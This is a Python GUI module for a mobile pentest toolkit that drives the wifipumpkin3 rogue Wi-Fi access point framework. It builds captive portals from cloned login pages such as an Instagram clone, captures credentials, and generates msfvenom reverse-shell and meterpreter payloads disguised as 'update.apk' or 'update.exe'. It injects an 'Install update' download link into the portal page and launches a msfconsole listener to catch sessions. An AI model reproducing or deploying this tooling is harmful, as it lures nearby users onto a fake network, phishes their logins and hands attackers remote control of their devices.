"""Wifipumpkin3 rogue-AP framework.

Options are set in the GUI, including the captive-portal template, which
is discovered from wifipumpkin3's templates folder at runtime, and then
wifipumpkin3 opens in a terminal with an -x startup script applying them.

2025 mobile-hacker extensions:

* **Payload delivery via captive portal**. The captive-portal template
  can serve an APK / EXE / .mobileconfig behind the login screen. The
  operator picks a payload with msfvenom (Android reverse shell,
  Windows meterpreter, macOS bash reverse), the module drops it under
  the currently selected template's ``static/`` folder, patches
  ``index.html`` to point ``<a download>`` at it, and starts a
  msfconsole listener in a companion terminal with a matching
  handler config.
* **Karma takeover contract**. Karma can deep-link here with a
  ``karma_takeover:<ssid>:<iface>[:<channel>]`` target; we pre-fill
  the AP config so the operator hits Start and the AP goes live
  under the same SSID the client already associated to.
* **Deep-links out** to Wireless-ADB (Android devices that connected
  through us often expose ADB pairing on-LAN), evilginx3 (phishkin3),
  and mitmproxy.
"""
from __future__ import annotations

import os
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import ToolRunner, toast

# wifipumpkin3 keeps its captive-portal templates in one of these; the Debian
# package uses the dist-packages path.
TEMPLATE_DIRS = [
    "/usr/lib/python3/dist-packages/wifipumpkin3/data/config/templates",
    "/usr/share/wifipumpkin3/config/templates",
    "/root/.config/wifipumpkin3/config/templates",
]
# set proxy <name>; the captive portal is captiveflask, not pumpkinproxy
# (pumpkinproxy is the transparent MITM proxy, a different thing).
PROXIES = {
    "None": None,
    "Captive Flask portal": "captiveflask",
    "Transparent proxy (pumpkinproxy)": "pumpkinproxy",
    "Sniffkin3 (capture creds)": "sniffkin3",
}


@register
class Wifipumpkin(NHModule):
    title = "Wifipumpkin3"
    icon = "nethunter-wifipumpkin-symbolic"
    description = "Rogue access point framework"
    required_tools = ["wifipumpkin3"]

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, f"set_margin_{m}")(12)

        group = Adw.PreferencesGroup(
            title="Access point",
            description="Needs a Wi-Fi interface that supports AP mode.",
        )
        self.iface = Adw.EntryRow(title="AP interface")
        self.iface.set_text("wlan1")
        group.add(self.iface)
        # The interface with internet, shared to the AP's clients (-iNet).
        # Leave empty for a captive portal that does not pass traffic through.
        # wlan0 is the internal Wi-Fi, which normally holds the real connection.
        self.iface_net = Adw.EntryRow(title="Internet interface (share to clients)")
        self.iface_net.set_text("wlan0")
        group.add(self.iface_net)
        self.ssid = Adw.EntryRow(title="SSID")
        self.ssid.set_text("Free WiFi")
        group.add(self.ssid)

        self.proxy = Adw.ComboRow(
            title="Proxy / capture module",
            model=Gtk.StringList.new(list(PROXIES)),
        )
        group.add(self.proxy)

        # Captive-portal template, discovered from the templates folder.
        self.template = Adw.ComboRow(title="Captive-portal template")
        self.template_model = Gtk.StringList()
        self.template_model.append("None")
        self.template.set_model(self.template_model)
        group.add(self.template)

        refresh = Adw.ActionRow(title="Refresh templates", subtitle="Rescan wifipumpkin3 templates")
        rb = Gtk.Button(label="Refresh", valign=Gtk.Align.CENTER)
        rb.connect("clicked", lambda _b: self._load_templates())
        refresh.add_suffix(rb)
        group.add(refresh)

        # Where the templates live, so more can be dropped in from a terminal.
        where = Adw.ActionRow(
            title="Templates folder",
            subtitle="/usr/share/wifipumpkin3/config/templates — add your own "
            "here, then Refresh")
        where.set_subtitle_selectable(True)
        group.add(where)
        box.append(group)

        # ---- build a portal from a git repo -----------------------------
        bg = Adw.PreferencesGroup(
            title="Build a portal from a login page repo",
            description="Paste a git URL of a login page (e.g. "
            "github.com/trananhtuat/instagram-login). It becomes a captive "
            "portal template; the cloned source is deleted afterwards.")
        self.repo_entry = Adw.EntryRow(title="git URL")
        bg.add(self.repo_entry)
        build_row = Adw.ActionRow(
            title="Build and install",
            subtitle="Clone, convert, install, then Refresh templates to see it")
        bb = Gtk.Button(label="Build", valign=Gtk.Align.CENTER)
        bb.add_css_class("suggested-action")
        bb.connect("clicked", lambda _b: self._build_portal())
        build_row.add_suffix(bb)
        bg.add(build_row)
        box.append(bg)

        # ---- payload delivery via captive portal ----------------
        pg = Adw.PreferencesGroup(
            title="Payload delivery (via captive portal)",
            description="Drop an APK / EXE / .mobileconfig into the "
                        "selected template's static/ folder and "
                        "spin up a msfconsole listener. Requires "
                        "captiveflask + a template selected above.")

        self.payload_kind = Adw.ComboRow(title="Payload")
        self.payload_kind.set_model(Gtk.StringList.new([
            "Android APK (reverse TCP meterpreter)",
            "Windows EXE (reverse TCP meterpreter)",
            "macOS bash reverse shell",
            "Linux ELF (reverse TCP)",
            "iOS mobileconfig (proxy install)",
        ]))
        pg.add(self.payload_kind)

        self.lhost = Adw.EntryRow(title="LHOST (attacker IP)")
        # Try to guess the AP's own IP -- the phone's wlan1 usually
        # lives at 10.0.0.1 after wifipumpkin3 boots.
        self.lhost.set_text("10.0.0.1")
        pg.add(self.lhost)

        self.lport = Adw.SpinRow.new_with_range(1, 65535, 1)
        self.lport.set_title("LPORT")
        self.lport.set_value(4444)
        pg.add(self.lport)

        gen_row = Adw.ActionRow(
            title="Generate payload",
            subtitle="msfvenom -> template static/ folder")
        gen_btn = Gtk.Button(label="Generate",
                             valign=Gtk.Align.CENTER)
        gen_btn.add_css_class("suggested-action")
        gen_btn.connect("clicked",
                        lambda _b: self._generate_payload())
        gen_row.add_suffix(gen_btn)
        pg.add(gen_row)

        listener_row = Adw.ActionRow(
            title="Start msfconsole listener",
            subtitle="exploit/multi/handler in a separate terminal")
        listener_btn = Gtk.Button(label="Listen",
                                  valign=Gtk.Align.CENTER)
        listener_btn.connect("clicked",
                             lambda _b: self._start_listener())
        listener_row.add_suffix(listener_btn)
        pg.add(listener_row)
        box.append(pg)

        # ---- deep-links to sibling modules ---------------------
        chain = Adw.PreferencesGroup(
            title="Chain",
            description="Related workflows once clients are on us.")
        for label, module_id, hint in (
            ("evilginx3 / phishkin3", "phishkin3",
             "MFA relay portal keyed by SSID brand"),
            ("Android Wireless ADB", "android_rce",
             "Scan associated clients for adb-tls-connect"),
            ("Evil Twin (WPA2 attracts more)", "evil_twin",
             "Restart the AP with a WPA2 PSK to lure more devices"),
        ):
            r = Adw.ActionRow(title=label, subtitle=hint)
            btn = Gtk.Button(label="Open",
                             valign=Gtk.Align.CENTER)
            btn.connect(
                "clicked",
                lambda _b, m=module_id:
                    self.app_window.activate_module(m, ""))
            r.add_suffix(btn)
            chain.add(r)
        box.append(chain)

        actions = Adw.PreferencesGroup()
        start = Adw.ActionRow(
            title="Start rogue AP",
            subtitle="Opens wifipumpkin3 in a terminal with your options",
        )
        sb = Gtk.Button(label="Start", valign=Gtk.Align.CENTER)
        sb.add_css_class("suggested-action")
        sb.connect("clicked", self._start)
        start.add_suffix(sb)
        actions.add(start)
        box.append(actions)

        self.runner = ToolRunner()
        box.append(self.runner)

        self._load_templates()
        return box

    def _load_templates(self) -> None:
        def done(result: Result) -> None:
            # Reset to just "None", then add discovered templates.
            while self.template_model.get_n_items() > 1:
                self.template_model.remove(1)
            for name in sorted(result.stdout.split()):
                if name:
                    self.template_model.append(name)

        globbed = " ".join(f"{d}/" for d in TEMPLATE_DIRS)
        run_async(
            ["sh", "-c", f"for d in {globbed}; do [ -d \"$d\" ] && ls -1 \"$d\"; done 2>/dev/null | sort -u"],
            done, timeout=10,
        )

    def _build_portal(self) -> None:
        url = self.repo_entry.get_text().strip()
        if not url:
            from ..widgets import toast
            toast(self.app_window, "Paste a git URL first")
            return
        # The generator clones, converts, installs into wifipumpkin3 and deletes
        # the source. It writes into the system templates dir, so it runs as
        # root through the same path as everything else. Output streams live.
        builder = "/usr/libexec/nethunter-pro-make-captiveportal"
        self.runner.output.append("Building a portal from %s …\n" % url)
        self.runner.run([builder, url], root=True)
        # When it finishes, refresh the template list so the new one appears.
        from gi.repository import GLib
        GLib.timeout_add_seconds(6, lambda: (self._load_templates(), False)[1])

    def _start(self, _b: Gtk.Button) -> None:
        iface = self.iface.get_text().strip() or "wlan1"
        ssid = self.ssid.get_text().strip() or "Free WiFi"
        script = f"set interface {iface}; set ssid {ssid}; "

        # Share internet to the AP's clients if an internet interface is given.
        # This is the -iNet option; wifipumpkin3 sets up the NAT/forwarding.
        iface_net = self.iface_net.get_text().strip()
        if iface_net:
            script += f"set interface_net {iface_net}; "

        proxy = PROXIES[list(PROXIES)[self.proxy.get_selected()]]
        if proxy:
            # Just select the proxy. The old "ignore <proxy> off" was wrong --
            # ignore takes a logger class name, not a proxy, and wifipumpkin3
            # answered with 'requires a correct name of logger class'.
            script += f"set proxy {proxy}; "

        # With the captive portal, the template is chosen by enabling it on the
        # captiveflask proxy -- "set captiveflask.<Template> true" -- which is
        # what writes DarkLogin=true into captive-portal.ini. It is not a
        # templates.custom path; that command installs new templates rather than
        # selecting an existing one, which is why the old script showed no portal.
        tidx = self.template.get_selected()
        if proxy == "captiveflask" and tidx > 0:
            item = self.template_model.get_item(tidx)
            if item:
                tmpl = item.get_string()
                script += f"set captiveflask.{tmpl} true; "
        script += "start"
        self.runner.run_in_terminal(["wifipumpkin3", "-x", script], root=True)

    # ---------------------------------------- payload delivery
    def _selected_template_dir(self) -> str | None:
        """Return the on-disk path of the selected captive-portal
        template. We can't just glob every dir because the templates
        are duplicated across install locations; the first hit wins."""
        idx = self.template.get_selected()
        if idx <= 0:
            return None
        item = self.template_model.get_item(idx)
        if not item:
            return None
        name = item.get_string()
        for d in TEMPLATE_DIRS:
            candidate = Path(d) / name
            if candidate.exists():
                return str(candidate)
        return None

    def _payload_specs(self) -> tuple[str, str, str, str]:
        """Return ``(msfvenom_payload, filename, mime, meterpreter_type)``
        for the currently selected payload kind."""
        idx = self.payload_kind.get_selected()
        table = [
            ("android/meterpreter/reverse_tcp",
             "update.apk", "application/vnd.android.package-archive",
             "android/meterpreter/reverse_tcp"),
            ("windows/meterpreter/reverse_tcp",
             "update.exe", "application/x-msdownload",
             "windows/meterpreter/reverse_tcp"),
            ("osx/x64/shell_reverse_tcp",
             "update.sh", "application/x-sh",
             "osx/x64/shell_reverse_tcp"),
            ("linux/x86/shell/reverse_tcp",
             "update.elf", "application/x-executable",
             "linux/x86/shell/reverse_tcp"),
            ("cmd/unix/reverse",     # placeholder for iOS profile
             "profile.mobileconfig", "application/x-apple-aspen-config",
             "cmd/unix/reverse"),
        ]
        return table[idx]

    def _generate_payload(self) -> None:
        tmpl = self._selected_template_dir()
        if tmpl is None:
            toast(self.app_window,
                  "Pick a captive-portal template first")
            return
        payload, fname, _mime, _handler = self._payload_specs()
        lhost = self.lhost.get_text().strip() or "10.0.0.1"
        lport = int(self.lport.get_value())

        # Drop into <template>/static/, mkdir if needed, patch
        # index.html so the login button also links to the payload.
        static_dir = tmpl + "/static"
        out_path = static_dir + "/" + fname
        stamp = time.strftime("%Y%m%d-%H%M%S")
        loot_copy = loot_path(
            "wifipumpkin", "payload-%s-%s" % (stamp, fname))

        script = (
            "set -e; "
            "mkdir -p %s; "
            "msfvenom -p %s LHOST=%s LPORT=%d -o %s; "
            "cp %s %s; "
            # Best-effort HTML patch: insert a download button just
            # before </body>. Idempotent-ish; if the template already
            # has an update button we simply append another one.
            "if [ -f %s/index.html ] && "
            "   ! grep -q 'nhp-payload-link' %s/index.html; then "
            "  sed -i 's|</body>|<a id=\"nhp-payload-link\" "
            "  href=\"/static/%s\" download style=\"display:block;"
            "  margin:20px auto;text-align:center;color:#0af\">"
            "  Install update</a></body>|' %s/index.html; "
            "fi; "
            "chmod 644 %s; "
            "echo ---payload-ready---"
        ) % (static_dir, payload, lhost, lport, out_path,
             out_path, loot_copy,
             tmpl, tmpl, fname, tmpl, out_path)

        self.runner.output.append(
            "# generating %s payload for %s:%d\n"
            % (payload, lhost, lport))

        def done(r: Result) -> None:
            self.runner.output.append(r.stdout or "")
            if r.stderr:
                self.runner.output.append(r.stderr)
            if "---payload-ready---" in (r.stdout or ""):
                get_loot_store().record(
                    module="wifipumpkin", type="payload_apk",
                    target="%s:%d" % (lhost, lport),
                    path=loot_copy,
                    notes="delivered via captive portal at "
                          + out_path)
                toast(self.app_window,
                      "Payload ready at /static/" + fname)

        run_async(["sh", "-c", script], done,
                  root=True, timeout=180)

    def _start_listener(self) -> None:
        payload, _fname, _mime, handler = self._payload_specs()
        lhost = self.lhost.get_text().strip() or "10.0.0.1"
        lport = int(self.lport.get_value())
        rc_path = "/tmp/nhp-msf-handler.rc"
        rc = (
            "use exploit/multi/handler\n"
            "set PAYLOAD %s\n"
            "set LHOST %s\n"
            "set LPORT %d\n"
            "set ExitOnSession false\n"
            "run -j\n"
        ) % (handler, lhost, lport)
        try:
            with open(rc_path, "w") as fp:
                fp.write(rc)
        except OSError:
            toast(self.app_window,
                  "Could not write msfconsole rc file")
            return
        self.runner.run_in_terminal(
            ["msfconsole", "-q", "-r", rc_path], root=True)

    # ---------------------------------------- deep-link IN
    def set_target(self, target: str) -> None:
        """Two shapes we accept:

          * ``karma_takeover:<ssid>:<iface>[:<channel>]`` -- from
            karma.py when the operator flips the wifipumpkin hook on.
          * ``<ssid>`` -- bare SSID from anywhere else; we just
            pre-fill the ssid field."""
        if not target:
            return
        if target.startswith("karma_takeover:"):
            parts = target.split(":")
            if len(parts) >= 2 and parts[1]:
                self.ssid.set_text(parts[1])
            if len(parts) >= 3 and parts[2]:
                self.iface.set_text(parts[2])
            toast(self.app_window,
                  "Karma takeover: SSID + iface pre-filled; press Start")
            return
        self.ssid.set_text(target)
